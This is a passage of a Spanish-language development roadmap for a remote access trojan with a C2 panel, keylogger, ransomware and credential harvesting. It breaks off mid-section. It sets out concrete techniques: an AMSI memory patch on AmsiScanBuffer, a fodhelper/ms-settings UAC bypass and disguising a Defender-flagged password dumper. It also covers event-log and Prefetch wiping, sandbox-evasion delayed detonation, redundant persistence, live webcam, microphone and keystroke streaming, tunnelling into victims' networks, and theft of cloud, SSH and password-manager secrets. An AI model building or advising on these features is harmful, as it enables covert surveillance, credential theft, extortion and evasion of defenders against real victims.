# Plan de endurecimiento y ampliación 0.4+

**Base:** `docs/INFORME_RAT.md` (9-nov-2026), rama `fix/0.3.7-rat-hardening`.
**Objetivo:** cerrar los defectos de fiabilidad, reducir huella, ampliar control y
recolección, y profesionalizar el panel sin romper el contrato v1.

## Reglas de ejecución

- Windows 11 primero. Linux/macOS entran como paridad y nunca bloquean una fase.
- Perfil `lite`: 256 MiB de heap, 2 CPUs, artefactos 64 MiB, sin credenciales ni
  seeds. Perfil `full`: 512 MiB, artefactos 512 MiB, módulos opt-in.
- El servidor **nunca** inicia conexiones hacia la víctima. Todo túnel o stream
  viaja sobre el WebSocket que ya abre el agente.
- El contrato v1 no se edita. Toda capacidad nueva entra por `contract/v2/` con
  negociación y soporte dual; el panel solo la ofrece si la víctima anuncia la
  capability correspondiente.
- Cada PR actualiza `docs/COVERAGE.md`, `docs/KNOWN_ERRORS.md` y `docs/OPSEC.md`
  cuando aplique, trae tests y se puede revertir con una feature flag.
- Presupuesto por tarea medido y cancelable. Un módulo nuevo no puede superar el
  presupuesto del perfil ni bloquear el heartbeat.

## Puerta de contrato v2 (bloquea todo P2)

**Diseño:** crear `contract/v2/` copiando v1 y añadiendo solo campos y tipos
nuevos. El agente 0.4 envía `X-Contract: 2` y `contract: 2` en `/enroll`; el
servidor responde `contract: 2` y la lista de capabilities aceptadas. Si el
servidor solo entiende 1, el agente reintenta en v1 y oculta las funciones
nuevas. Se añade `Victim.capabilities` (`String[]`) y `config_epoch`; el panel
deja de comparar versiones y usa capabilities (`pty`, `input`, `media`,
`tunnel`, `cloud`, `pm`, `steam`, `wc`, `triggers`, `miner`). Los endpoints y
tareas existentes no cambian.

**Ficheros:** `contract/v2/**`, `contract/v1/**` (intacto), `console/server/lib/ws-protocol.ts`,
`console/server/lib/agent-compat.ts` (nuevo), `console/prisma/schema.prisma`,
`agent/.../PanelSocket.java`, `CryptoModule.java`, `CryptoConfig.java`.
**Riesgos:** duplicación de validador; divergencia. Se mitiga con un test que
ejecuta el mismo corpus contra v1 y v2 y con un único normalizador.
**Aceptación:** un agente 0.3.7 sigue operando todas las tareas v1 contra un
servidor 0.4; un agente 0.4 degrada a v1 contra un servidor 0.3.7; el panel no
muestra acciones v2 para una víctima sin capability.
**Esfuerzo:** 6–9 días. **Dependencia:** cierra P0 y precede a P2.

---

# Fase 0 — Corrección y fiabilidad (release 0.3.9)

## P0.1 Pipeline de build reproducible y verificado

**Prioridad:** P0. **Motivación:** `agent.bin` se copia sin hash; un agente
obsoleto o truncado solo se detecta en la víctima. La versión del agente y del
mod ya divergen por dos fuentes (`gradle.properties` y `agent/build.gradle`).
**Diseño:** `version.txt` en raíz como única fuente. `signAgent` publica
`agent.sha256`; `copyAgent` copia `agent.bin` y `agent.sha256`; una tarea
`verifyAgentBin` recalcula SHA-256, compara y se engancha a `processResources`,
`check` y `release`. El stager lee el hash embebido, lo verifica antes de
instalar y antes de lanzar, y escribe `.version` como `<version> <sha>`. CI:
job Linux que construye y valida ambos artefactos, job Windows que firma
Authenticode y ejecuta smoke; el release compara el hash del `agent.bin` dentro
del mod con `agent.jar` y falla si no coincide.
**Áreas:** `build.gradle`, `agent/build.gradle`, `Stager.java`,
`StagerPaths.java`, `.github/workflows/*.yml`, `docs/KNOWN_ERRORS.md`.
**Riesgos:** builds más lentos; falso negativo si el hash se genera después de
firmar. Orden fijo: compilar → firmar → hash → empaquetar. SHA-256 no es firma;
la autenticidad la da el manifiesto RSA.
**Aceptación:** alterar un byte de `agent.bin` rompe el build; un `agent.bin`
manipulado en disco no se ejecuta y fuerza reinstalación; `./gradlew release`
desde limpio produce hashes iguales en dos ejecuciones; CI falla si las
versiones difieren.
**Esfuerzo:** 2–3 días.

## P0.2 Versión única y retirada del 0.3.8 huérfano

**Prioridad:** P0. **Motivación:** 0.3.8 es un build local anterior a 0.3.7 y
obliga a parches en dos sitios (`actions.ts` y `tasks.ts`).
**Diseño:** `version.txt` + `verifyVersions`; el agente lee la versión de
`BuildInfo` generado y el mod de la propiedad inyectada. Centralizar el mapeo
legacy en `console/server/lib/agent-compat.ts` con
`legacyLevel('0.3.8') -> '0.3.6.99'` y `capabilitiesFor(version)`. El panel
muestra `0.3.8 (legacy)` y una sola advertencia. Se elimina el parseo duplicado.
**Áreas:** `version.txt`, ambos `build.gradle`, `VersionTest`, `actions.ts`,
`tasks.ts`, `agent-compat.ts`, `docs/KNOWN_ERRORS.md`.
**Riesgos:** agentes antiguos con formatos raros. El mapa es explícito y el
fallback es tratar la versión como 0.0.0 (solo tareas base).
**Aceptación:** no queda ningún literal `0.3.8` fuera de `agent-compat.ts` y su
test; una víctima 0.3.8 ve exactamente las acciones de 0.3.6.99; el release
falla si `version.txt`, mod y agente no coinciden.
**Esfuerzo:** 1 día.

## P0.3 Eliminar `wmic` (CIM/PowerShell)

**Prioridad:** P0. **Motivación:** `wmic` está deprecado y puede no existir en
Windows 11 reciente; hoy se usa para PID del juego, UUID, clave OEM, antivirus
y arranque.
**Diseño:** helper único `Cim.query()` que ejecuta `powershell -NoP
-NonInteractive -Command` con `Get-CimInstance` y `ConvertTo-Json -Compress`,
timeout y parser tolerante. Sustituciones: `Win32_Process` para `javaw.exe`,
`Win32_ComputerSystemProduct` para UUID, `SoftwareLicensingService` para
OA3xOriginalProductKey, `root/SecurityCenter2:AntiVirusProduct` para AV y
`Win32_StartupCommand` para inicio. `Bootstrap` usa CIM con fallback a
`systeminfo`/`tasklist` si PowerShell falla.
**Áreas:** `GamePid.java`, `Bootstrap.java`, `CommandExecutor.java`,
`console/src/lib/actions.ts`, `docs/UI.md`, `docs/KNOWN_ERRORS.md`.
**Riesgos:** latencia de PowerShell y bloqueo de políticas. Timeout 8 s, sin
perfil, y fallback silencioso; el diagnóstico reporta `cim_unavailable`.
**Aceptación:** en Win11 24H2 con la feature WMIC desinstalada, `recon`, `av`,
`startup`, `game-pid` y `productkey` funcionan; no aparece `wmic` en el código
salvo docs históricos; tests de parser con JSON real y con salida vacía.
**Esfuerzo:** 2 días.

## P0.4 Cola offline de resultados con backoff y jitter

**Prioridad:** P0. **Motivación:** si el panel o la red caen, `postResult`
escribe un fichero y lo manda solo por Discord; con Discord desactivado el
resultado se pierde y la tarea queda `running` hasta expirar.
**Diseño:** outbox durable en `cache/outbox/` (tmp + `ATOMIC_MOVE`, nombre
`<seq>-<task>-<sha>.json`). Todo resultado se escribe **antes** de intentar
WS/HTTP. Un worker dedicado reintenta con backoff 2 s → 5 min, jitter ±30 %,
20 intentos, y para ante 409 (duplicado) o 410. Se despierta al reconectar, tras
re-enrolar y desde el watchdog. Orden FIFO por tarea; dedupe por `task_id`;
límite 4.000 entradas/64 MiB; poda de terminales a las 72 h. El sink Discord
pasa a ser un intento más, no el sustituto. Estado y contadores visibles en
heartbeat (`outbox`, `outbox_oldest`).
**Áreas:** `CryptoModule.java`, `Poller.java`, `State.java`, `AgentPaths.java`,
`CryptoTransport.java`, nuevo `Outbox.java`, tests con reloj falso.
**Riesgos:** reintentos duplicados y crecimiento en disco. Idempotencia del
servidor + poda; nunca se reintenta `unknown_build`/`403`/`410`.
**Aceptación:** matar el panel durante un resultado y revivirlo 10 min después
cierra la tarea una sola vez; reiniciar el agente conserva la cola; 20 fallos
respetan el techo de 5 min; un 409 borra la entrada; el outbox no supera 64 MiB
con 5.000 resultados.
**Esfuerzo:** 4–6 días.

## P0.5 Preflight de `build_secret`/`victim_id` y error legible

**Prioridad:** P0. **Motivación:** una config desajustada produce un fallo
asíncrono `Unsupported state or unable to authenticate data`, sin decir qué
build o víctima falla.
**Diseño:** validación en tres capas. (1) Agente: `CryptoConfig.preflight()`
exige base64url de 32 bytes, UUIDs válidos y https; `ArtifactPack` escribe
`build_id` y `victim_id` y compara con el transporte antes de encolar. (2)
Servidor en `commitUpload`: comparar manifiesto con `victim.buildId` y
`victim.id`, derivar la clave y descifrar de verdad el primer blob en streaming;
si falla, `422 artifact_key_mismatch` con mensaje accionable y campos
`build_id_agent`, `build_id_server`, `victim_id_agent`. (3) Evento
`artifact_key_mismatch` y toast en el panel. Un `key_probe` en `/hb` (v2) evita
subir 512 MiB para descubrirlo.
**Áreas:** `CryptoConfig.java`, `ArtifactPack.java`, `CryptoModule.java`,
`console/server/services/artifact.ts`, `console/server/routes/agent.ts`,
`contract/v2` (probe), `docs/KNOWN_ERRORS.md`.
**Riesgos:** coste de descifrar en commit; se limita a un blob de 64 KiB. La
compatibilidad v1 se mantiene: sin probe, el commit sigue validando.
**Aceptación:** víctima del build A con config B recibe 422 con mensaje claro en
< 1 s; un artefacto válido nunca falla por autenticación; el panel muestra el
evento; test unitario de cada campo corrupto.
**Esfuerzo:** 2–3 días.

## P0.6 Telemetría de errores de tarea y módulo en el panel

**Prioridad:** P0. **Motivación:** los fallos viven en `agent.log` y en
`task.error`; no hay vista agregada ni alerta, así que un módulo roto pasa
desapercibido.
**Diseño:** eventos `task_failed`, `module_degraded`, `artifact_failed` y
`outbox_dropped`, deduplicados por `(victim, module, error_class)` durante 10
min. El servidor persiste la transición de módulo desde `/hb` y publica
`victim.health`. UI: badge en la fila, pestaña “Salud”, tarjeta “errores 24 h” y
contador por módulo; `GET /victims/:id/diagnostics` con la última muestra.
Límite de 2 KB por error y redacción de rutas de usuario.
**Áreas:** `ws-events.ts`, `task-result.ts`, `routes/agent.ts`, `schema.prisma`
(`AgentHealth` o índice sobre Event), `victim-detail.tsx`, `dashboard/page.tsx`,
`docs/KNOWN_ERRORS.md`.
**Riesgos:** volumen de eventos. Dedupe + retención 30 días + solo transiciones.
**Aceptación:** forzar un fallo de DPAPI produce evento y badge en < 30 s; al
volver a `ok` el badge se apaga; el contador del dashboard cuadra con la tabla;
5.000 fallos del mismo tipo generan una fila.
**Esfuerzo:** 3 días.

## P0.7 Cancelación y presupuesto reales en harvest, ransomware y monitor

**Prioridad:** P0. **Motivación:** `harvest(task)` ignora `cancel`, el
ransomware lee ficheros enteros en memoria y el monitor no acota bytes; el
timeout no siempre se distingue de una cancelación.
**Diseño:** interfaz `Budget` (deadline, bytes, operaciones) inyectada en los
tres. `harvest` recibe `AtomicBoolean`, comprueba entre ficheros y escribe ZIP
parcial con `partial=true`; `ransomware` cifra en streaming
(`CipherOutputStream`), escribe `.spc.part` y renombra al terminar cada fichero,
y para entre ficheros; `monitor` reutiliza `BufferedImage`, interrumpe el sleep
y corta por frames, segundos y 3,5 MiB. `handle` usa un plazo único y el
resultado distingue `cancelled` de `timeout`. Se audita `scan`, `crack` y
`ddos` con el mismo criterio.
**Áreas:** `CryptoModule.java`, `Harvest.java`, `ArtifactPack.java`,
`TaskParams.java`, tests de `CryptoModule`/`Harvest`.
**Riesgos:** ZIP parcial y `.spc.part` huérfanos. Limpieza al arrancar y marca
en el resultado; el ransomware es idempotente por extensión.
**Aceptación:** cancelar harvest a mitad deja ZIP parcial y responde
`cancelled` en < 5 s; cancelar ransomware no deja ficheros corruptos y se puede
reanudar; un monitor de 120 s no supera 3,5 MiB; un timeout responde `timeout`
y no `cancelled`; memoria estable con un fichero de 200 MiB.
**Esfuerzo:** 3–5 días.

---

# Fase 1 — OPSEC y evasión (release 0.4.0)

## P1.1 Cadena de firma estable y verificable

**Prioridad:** P1. **Motivación:** hoy se genera un PKCS#12 nuevo en cada build,
sin timestamp ni Authenticode; la firma no identifica al editor y ChromeElevator
va sin firmar.
**Diseño:** keystore PKCS#12 estable en secreto de CI (`SPC_AGENT_P12`,
`SPC_AGENT_P12_PASS`), alias y SHA-256 público en `docs/SIGNING.md`. `jarsigner`
con SHA-256, `-tsa` RFC3161 y verificación obligatoria. Los PE auxiliares
(ChromeElevator renombrado, lanzador si existe) se firman con `osslsigncode` en
Linux y `signtool` en el job Windows, y se verifica `Get-AuthenticodeSignature`.
La clave de actualización RSA-3072 sigue siendo ancla separada; se documenta la
diferencia entre integridad JAR y autenticidad Authenticode.
**Áreas:** `agent/build.gradle`, `.github/workflows/release.yml`,
`docs/SIGNING.md`, `docs/OPSEC.md`, `NOTICE`.
**Riesgos:** custodia y caducidad del certificado; dependencia del TSA. Pin de
certificado público, alerta 60 días antes y firma con dos TSA.
**Aceptación:** `jarsigner -verify` devuelve “jar verified” y sello de tiempo;
`Get-AuthenticodeSignature` es `Valid` en Win11; el release falla sin firma o
sin timestamp; rotación documentada y probada.
**Esfuerzo:** 2–3 días.

## P1.2 Ofuscación real del agente

**Prioridad:** P1. **Motivación:** ProGuard está, pero
`-keepclassmembers class ** { *; }` y `-dontoptimize` conservan nombres de
miembros y cadenas; `strings` sigue delatando `serverpackcore`, `Discord` y
`DPAPI`.
**Diseño:** quitar el keep global; keeps explícitos solo para manifest,
`Premain`, listener WebSocket, `Json` y recursos por nombre. Añadir
`-repackageclasses 's'`, `-allowaccessmodification`,
`-overloadaggressively`, optimización 3 pasadas y eliminación de
`SourceFile/LineNumberTable` en release. Un paso ASM previo cifra literales
seleccionados con XOR y los descifra en `<clinit>`; se archiva `mapping.txt` y
se usa para desofuscar stacks. Renombrar recursos a nombres neutros.
**Áreas:** `agent/proguard-rules.pro`, `agent/build.gradle`, nuevo
`agent/tools/Scramble.java` o plugin ASM, `Abe.java`, recursos, CI.
**Riesgos:** romper reflexión o el `--smoke`; pérdida de trazabilidad. Tests
completos, smoke, `jdeps` y mapa en el artefacto de release; flag
`-PnoObfuscate` para diagnóstico.
**Aceptación:** `strings agent.jar | grep -ci serverpackcore` ≤ 2; paquetes
visibles en `s`; todas las pruebas y `--smoke` pasan; el jar arranca en Win11;
el tamaño baja ≥ 15 %; un stack de prueba se desofusca con el mapping.
**Esfuerzo:** 5–8 días.

## P1.3 Cifrado en reposo de `keys.log`, `passwords.log` y `seeds.log`

**Prioridad:** P1. **Motivación:** son el material más sensible y hoy están en
claro y en claro viajan al harvest.
**Diseño:** `SealedLog` con clave HKDF del `build_secret` y etiqueta por fichero;
línea `v1.<nonce>.<ct>.<tag>` en base64, append y rotación iguales a las
actuales. El panel detecta el prefijo, descifra al ingerir y guarda una copia
`*.raw` con permisos 0600; la vista de keylogger sigue leyendo las filas ya
normalizadas. `convertLog` descifra antes de convertir a JSONL. `agent log`
descifra para el operador. Compatibilidad: ficheros sin prefijo se tratan como
texto.
**Áreas:** `Keylogger.java`, `OpsPaths.java`, `CryptoLog.java`, nuevo
`SealedLog.java`, `console/server/services/artifact.ts`,
`console/server/lib/ws-events.ts`, `docs/OPSEC.md`.
**Riesgos:** pérdida de legibilidad local y ficheros viejos. Detección de
formato, copia en claro solo al exportar y test de rotación.
**Aceptación:** `strings` de los tres logs no muestra la contraseña sembrada;
el panel muestra la fila; la rotación y el harvest funcionan; un log antiguo en
claro se sigue ingiriendo; un descifrado fallido genera evento y no pierde el
fichero.
**Esfuerzo:** 3–4 días.

## P1.4 AMSI, codificación y firma de los scripts PowerShell

**Prioridad:** P1. **Motivación:** el parche AMSI actual es solo el campo
`amsiInitFailed`; los scripts van en claro y con `-File`, visibles para
ScriptBlock logging y para `strings`.
**Diseño:** mantener el patch dinámico como primera opción y añadir un fallback
de parche en memoria (`VirtualProtect` sobre `AmsiScanBuffer`) solo si el campo
falla. Los scripts se comprimen y se ejecutan con `-EncodedCommand` UTF-16LE; se
guardan también en `.ps1` firmados para diagnóstico. Nombres de variables
neutros y concatenación de cadenas sensibles.
**Áreas:** `Ps.java`, `Keylogger.java`, `Bootstrap.java`, `resources/*.ps1`,
`docs/OPSEC.md`.
**Riesgos:** `.NET` actualizado que rompa el campo; doble parche. Fallback y
flag `-Dspc.amsi=off`; prueba en Win11 23H2/24H2.
**Aceptación:** el test EICAR de AMSI no bloquea el hook; ScriptBlock logging no
muestra el texto literal del script; keylogger, clipboard y DPAPI siguen
funcionando; `spc.amsi=off` ejecuta sin parche.
**Esfuerzo:** 3–4 días.

## P1.5 Sustituir/renombrar y firmar ChromeElevator

**Prioridad:** P1. **Motivación:** Defender lo marca como
`HackTool:Win64/PSWDump` y el nombre es buscable.
**Diseño:** ruta corta: renombrar el PE a `javacred.exe`, editar versión y
descripción con `rcedit`, firmar Authenticode y actualizar recurso, hash y
`NOTICE`. Si la detección persiste, compilar una build propia desde el código
MIT con solo el unwrap ABE, enlazado estático y sin cadenas de la versión
original; publicar fuente y hash. El agente verifica SHA-256 antes de ejecutar.
**Áreas:** `Abe.java`, `agent/src/main/resources/serverpackcore/*`,
`agent/build.gradle`, `NOTICE`, `docs/OPSEC.md`, `docs/COVERAGE.md`.
**Riesgos:** licencia MIT y mantenimiento; el binario propio puede divergir de
Chrome. Pin de versión, tests ABE en Chrome 127+ y vuelta al original si falla.
**Aceptación:** `Get-AuthenticodeSignature` válido; Defender actualizado en VM
limpia deja de marcarlo; el volcado ABE sigue funcionando; el hash embebido
coincide; `NOTICE` conserva la licencia.
**Esfuerzo:** 4–6 días.

## P1.6 Limpieza forense periódica y al instalar

**Prioridad:** P1. **Motivación:** Prefetch, Amcache, UserAssist, SRUM, eventos
de tarea y recientes delatan la instalación y el lanzador.
**Diseño:** módulo `Forensics` con `agent clean [--deep]`, ejecución al instalar
y cada 24 h con jitter. Nivel usuario: borra `Recent\*.lnk` cuyo destino
contiene nuestra ruta, claves UserAssist (valor hash de la ruta), MUICache y
`Run` reciente; limpia `cache` temporal. Nivel elevado (UAC opcional): Prefetch
de `JAVAW/WSCRIPT/POWERSHELL/JAVACRED`, backup y `wevtutil cl` del log de tareas
con tamaño máximo. Amcache y SRUM se intentan con copia de hive y edición
offline; si el ESE está bloqueado, se reporta “requiere SYSTEM” y se deja para
la tarea SYSTEM.
**Áreas:** nuevo `Forensics.java`, `Agent.java`, `CommandExecutor.java`,
`docs/OPSEC.md`, `docs/KNOWN_ERRORS.md`.
**Riesgos:** borrar entradas ajenas; locks y corrupción de hive. Lista blanca
por patrón, copia antes de tocar, idempotencia y límite 60 s.
**Aceptación:** tras `clean`, no quedan `*.pf` de nuestros procesos (elevado) y
las entradas UserAssist de la ruta desaparecen; el equipo arranca; el panel
recibe recuentos; dos ejecuciones seguidas no fallan; sin admin se reporta lo
no limpiado.
**Esfuerzo:** 8–12 días.

## P1.7 Rotación de UA, dominios de contacto y resolver dead-drop

**Prioridad:** P1. **Motivación:** UA fijo, un solo dominio y `api.ipify.org`
son huellas estables; el resolver existe pero no está endurecido.
**Diseño:** pool de UA realistas por SO/versión (Chrome/Edge) elegido por
instalación y persistido; se mantiene el UA `DiscordBot` solo para Discord por
Cloudflare. La config v2 acepta `c2_fallbacks[]` y `resolver_url`; el agente
baraja y prueba en orden, con last-known-good y TLS/host correctos. Resolver
firmado con RSA de actualización, respuesta `{panel_url, not_after, epoch}`,
TTL 6 h y pin. Opcional CDN: Cloudflare proxy delante de Caddy, WebSocket
soportado, sin domain fronting real (documentar límite). `ipify` se sustituye
por el eco de IP del propio panel en `/hb`.
**Áreas:** `CryptoTransport.java`, `PanelSocket.java`, `CryptoConfig.java`,
`Version.java`, `DiscordConfig.java`, `console/server/services/build.ts`,
`docs/OPSEC.md`, contrato v2.
**Riesgos:** CDN rompe WS o añade latencia; fallback a dominio caído. Health
check por transporte, máximo 2 fallbacks, timeout 5 s y vuelta al primario.
**Aceptación:** primario caído → fallback en < 60 s y vuelta al recuperar; UA
persistente y distinto entre instalaciones; respuesta de resolver manipulada se
rechaza; `ipify` desaparece del agente; Cloudflare documentado y probado.
**Esfuerzo:** 3–5 días.

## P1.8 Detección de VM/sandbox/depurador y detonación retardada

**Prioridad:** P1. **Motivación:** muchos sandboxes ejecutan y descartan el
agente en minutos; un depurador revela el comportamiento.
**Diseño:** `Sandbox.score()` con señales: fabricante/modelo BIOS, servicios
(`vboxservice`, `vmtoolsd`, `qemu-ga`), procesos de análisis, disco < 60 GB,
RAM < 4 GB, uptime < 10 min, usuario genérico, `-agentlib:jdwp`/`-Xdebug` y
padre de análisis. Score 0–100; config `detonation=always|delayed|score`,
retardo aleatorio 0–180 s antes de la primera conexión si score ≥ 60, salvo
`--force`. Evento `sandbox_suspected` con evidencias y score; el heartbeat lo
expone.
**Áreas:** nuevo `Sandbox.java`, `Agent.java`, `SysInfo.java`, `State.java`,
`CryptoConfig.java`, `docs/OPSEC.md`.
**Riesgos:** falsos positivos en portátiles modestos; retardo en víctimas
reales. Solo retarda la primera conexión, nunca el post-instalación; umbral
configurable y `--force`.
**Aceptación:** en VirtualBox/VMware el score ≥ 60 y hay retardo; en físico no;
con JDWP el score sube; unit tests con sondas inyectadas; `--force` conecta
inmediato.
**Esfuerzo:** 2–3 días.

## P1.9 Certificate pinning del C2

**Prioridad:** P1. **Motivación:** hoy solo se fija la IP por DoH; un MITM con CA
confiada pasa.
**Diseño:** pin SPKI SHA-256 en config y fallback embebido para DoH; doble pin
(actual y siguiente) para renovación de Let's Encrypt. `X509TrustManager`
propio con hostname verification, aplicado a `HttpsURLConnection` y al
`HttpClient` del WS. Un pin nuevo solo se acepta si viene firmado por la clave
de actualización. Pin mismatch genera evento legible y no cae a “confiar en
todo”.
**Áreas:** nuevo `CertificatePins.java`, `CryptoTransport.java`,
`PanelSocket.java`, `console/server/services/build.ts` (calcula pin del cert),
`docs/OPSEC.md`.
**Riesgos:** renovación y pin caducado dejan fuera a todos. Ventana de rotación
de 30 días, dos pins y tarea de verificación en CI con cert de staging.
**Aceptación:** proxy MITM con CA no confiada falla; con el pin correcto
funciona; la renovación con el pin siguiente no corta; un pin inválido se
reporta; test de rotación.
**Esfuerzo:** 4–5 días.

## P1.10 Redundancia de persistencia y watchdog secundario

**Prioridad:** P1. **Motivación:** tarea + `Run` comparten el mismo punto de
fallo; si el agente muere y el lanzador se borra, no hay recuperación.
**Diseño:** añadir `RunOnce` y un `.lnk` en `Startup` con nombre genérico,
verificando y reparando cada indicador por separado. `watchdog.vbs` oculto
arranca el lanzador, comprueba `session.txt`/`runtime.lock` cada 60 s durante
24 h y sale con `persist off`; el lanzador normal no lo duplica. El agente
reporta el estado de los cuatro indicadores. Sin bucles de procesos: mutex y
límite de 3 relanzamientos.
**Áreas:** `Persistence.java`, `AgentPaths.java`, `Stager.java`, recursos,
`docs/OPSEC.md`, tests de persistencia.
**Riesgos:** múltiples instancias y entradas duplicadas. Mutex, nombres libres y
limpieza de alias antiguos.
**Aceptación:** borrar tarea → `Run` arranca; borrar `Run` → `Startup` arranca;
matar el agente → watchdog en < 60 s; `persist off` deja los cuatro limpios; no
hay dos agentes.
**Esfuerzo:** 4–6 días.

## P1.11 UAC bypass opcional (fodhelper/computerdefaults)

**Prioridad:** P1. **Motivación:** `hives` y la limpieza profunda requieren
elevación y hoy dependen de que el usuario acepte un prompt.
**Diseño:** `Uac.elevate()` con cadena `computerdefaults` → `fodhelper` →
`sdclt`, escribiendo `HKCU\Software\Classes\ms-settings\Shell\Open\command`
con `DelegateExecute`, lanzando el PE y comprobando elevación con
`whoami /groups` (S-1-16-12288) en un marcador. Limpieza de claves al terminar.
Solo se usa para acciones puntuales, no para instalar.
**Áreas:** nuevo `Uac.java`, `Bootstrap.java`, `CommandExecutor.java`,
`docs/OPSEC.md`, `docs/KNOWN_ERRORS.md`.
**Riesgos:** parches de Microsoft y AV. Cadena con fallback y detección real de
nivel; si falla, se sigue en usuario y se avisa.
**Aceptación:** en Win11 23H2 y 24H2 `hives` obtiene SYSTEM sin clic derecho;
las claves quedan limpias; con UAC denegado hay fallback y mensaje; no se
rompe Explorer.
**Esfuerzo:** 3–4 días.

---

# Fase 2 — Control y recolección (release 0.5.0, requiere v2)

Presupuestos comunes: un solo slot `heavy`, 1 stream de túnel, 8 streams,
64 KiB de ventana, y todo cancelable. Las capabilities se anuncian en `/enroll`.

## P2.1 Shell interactiva persistente (ConPTY + xterm.js)

**Prioridad:** P2. **Motivación:** el corte a 60 s y la salida en bloque impiden
usar `vim`, `ssh`, REPLs o comandos largos.
**Diseño:** `Pty` con ConPTY vía JNA en Windows 10 1809+; `script -qfc` en
Linux y `script -q /dev/null` en macOS como fallback de paridad. Frames v2
`pty_open/data/resize/close` con `stream_id`, base64 y ACK; 4 KiB por frame,
64 KiB de cola, backpressure por crédito, idle 30 min, máximo 2 sesiones.
xterm.js + fit addon, historial por víctima y reconexión con replay de 64 KiB.
**Áreas:** nuevo `Pty.java`, `CryptoModule.java`, `CommandExecutor.java`,
`contract/v2/ws.md`, `console/src/components/console-panel.tsx`,
`schema.prisma` (`PtySession`), `package.json`.
**Riesgos:** JNA y DPI; procesos huérfanos. Cierre por árbol, test de Ctrl+C,
resize y desconexión.
**Aceptación:** PowerShell interactivo > 10 min, Ctrl+C, flechas y resize;
reconectar recupera 64 KiB; cerrar el panel mata el árbol; 2 sesiones
simultáneas no superan CPU/memoria del perfil.
**Esfuerzo:** 10–14 días.

## P2.2 Control remoto de ratón y teclado

**Prioridad:** P2. **Motivación:** el monitor es solo lectura; no se puede
interactuar con un diálogo o una wallet.
**Diseño:** tarea `input` con lotes `move|click|key|text|scroll`, `seq` y
normalización 0–65535; `SendInput` vía JNA para Unicode y DPI. Coalescer
movimientos a 60 Hz, teclas sin pérdida, ACK por lote. La UI superpone un canvas
al frame de monitor, captura teclado y puntero, y muestra cursor fantasma.
**Áreas:** nuevo `Input.java`, `contract/v2/task-schemas.json`,
`monitor-panel.tsx`, `docs/COVERAGE.md`.
**Riesgos:** inyección en la ventana equivocada y Ctrl+Alt+Del. Enfocar la
ventana destino por título/PID antes; documentar SAS.
**Aceptación:** escribir en Notepad, clic y arrastre, scroll y Unicode; 60 Hz sin
acumular; multi-monitor y DPI 150 % correctos; cancelar detiene la inyección.
**Esfuerzo:** 6–8 días.

## P2.3 Streaming de webcam y micrófono

**Prioridad:** P2. **Motivación:** hoy son una foto y un clip; la operación en
vivo requiere ver y oír.
**Diseño:** `media_start/stop` con `camera|mic`, dispositivo, duración y
`max_kbps`. Webcam por `ffmpeg -f mjpeg` a stdout, frames MJPEG por evento
`media_frame`; micrófono a Opus/WebM y chunks por `media_chunk`; el panel usa
`<img>` MJPEG y `MediaSource`. Límites: 640×480@15, 500 kbps; audio 16 kHz mono,
24 kbps; 120 s; cancelación inmediata.
**Áreas:** `CryptoModule.captureMedia`, nuevo `MediaStream.java`,
`contract/v2/ws.md`, `monitor-panel.tsx`, `docs/COVERAGE.md`.
**Riesgos:** ffmpeg ausente, CPU y buffering. Detección previa, fallback a clip
y aviso; sin transcodificación si el dispositivo ya entrega MJPEG.
**Aceptación:** 60 s de webcam y audio sin cortes, < 500/24 kbps, CPU bajo el
cap, stop en < 2 s, fallback a clip si no hay ffmpeg.
**Esfuerzo:** 8–10 días.

## P2.4 Keylogger en vivo por stream

**Prioridad:** P2. **Motivación:** hoy solo se ven contraseñas al hacer flush y
subirlas; no hay espejo en vivo.
**Diseño:** reutilizar el tail y emitir `key_stream` cada 1 s (máx. 512
caracteres) y `key_block` en cada flush, con `seq`, proceso y título. No se
persiste cada tecla; el panel guarda 500 bloques en memoria y el resto sigue en
`keys.log` cifrado. Marca de hueco al reconectar.
**Áreas:** `Keylogger.java`, `ws-events.ts`, `victim-detail.tsx`, contrato v2.
**Riesgos:** flood y ruido de ventanas. Coalescencia, solo bloques plausibles y
límite por evento.
**Aceptación:** el texto aparece en < 1,5 s; 500 teclas/s no generan más de 1
evento/s; reconectar indica hueco; el log persistente coincide con el stream.
**Esfuerzo:** 3 días.

## P2.5 SOCKS5 y port forwarding sobre el WebSocket

**Prioridad:** P2. **Motivación:** acceso a la LAN de la víctima sin abrir
puertos.
**Diseño:** frames `stream_open/data/credit/close` con `stream_id`; el agente
dial local y habla SOCKS5 (sin autenticación, solo loopback) o reenvía a
`host:port`. Límite 8 streams, 256 KiB totales, ventana 64 KiB, half-close.
Cliente: helper Node `spc-tunnel` que se autentica contra el panel, abre WSS y
expone `127.0.0.1:1080`; alternativa `ssh -L` contra el panel. El servidor no
inicia nada.
**Áreas:** nuevo `Tunnel.java` en agente, `contract/v2/ws.md`,
`console/server/routes/ws.ts`, `console/tools/spc-tunnel`, `docs/OPSEC.md`.
**Riesgos:** multiplexación y fugas de sockets. Límites, timeouts y cierre en
cascada; test de 10 MB y de half-close.
**Aceptación:** `curl --socks5` a un servicio de la LAN; `ssh -o ProxyCommand`
funciona; 10 MB sin corrupción; cerrar el helper cierra los streams; 9º stream
se rechaza con error claro.
**Esfuerzo:** 10–14 días.

## P2.6 Credenciales cloud, SSH, `.env` y git

**Prioridad:** P2. **Motivación:** el harvest actual no cubre la nube ni el
código, que es donde están los impactos altos.
**Diseño:** nuevo colector `cloud` (módulo `credentials`, solo `full`):
`~/.aws/{credentials,config}`, `~/.azure`, `~/.config/gcloud`, service accounts,
`~/.ssh/{id_*,config,known_hosts}`, `.env*` en Desktop/Documents/Downloads y
raíces de proyecto (máx. 200 ficheros/1 MiB), `.git-credentials`, `.gitconfig`
con `insteadOf` y `~/.docker/config.json`. Validación de formato AWS, expiración
JWT de Azure y JSON de service account; vista enmascarada y material completo en
el artefacto.
**Áreas:** nuevo `CloudCollector.java`, `Harvest.java`, `CryptoModule.java`,
contrato v2, `docs/COVERAGE.md`.
**Riesgos:** falsos positivos y volumen. Validadores estrictos, lista blanca de
rutas y presupuesto 12 MB.
**Aceptación:** fixtures de cada proveedor se detectan y clasifican; claves
inválidas se marcan; `.env` de 300 ficheros respeta el límite; nunca se sube
`node_modules`.
**Esfuerzo:** 5–7 días.

## P2.7 Extracción de gestores de contraseñas

**Prioridad:** P2. **Motivación:** KeePass, Bitwarden y 1Password concentran
credenciales que el navegador no tiene.
**Diseño:** fase 1, captura y metadatos (base de datos, keyfiles, `data.json`,
`Local Storage`, SQLite de 1Password) y descifrado con contraseña conocida o
diccionario acotado. KeePass con librería `kdbx4j` shaded (KDBX 3/4, Argon2 y
AES-KDF); Bitwarden/1Password con DPAPI/Keychain y claves cacheadas. Límite de
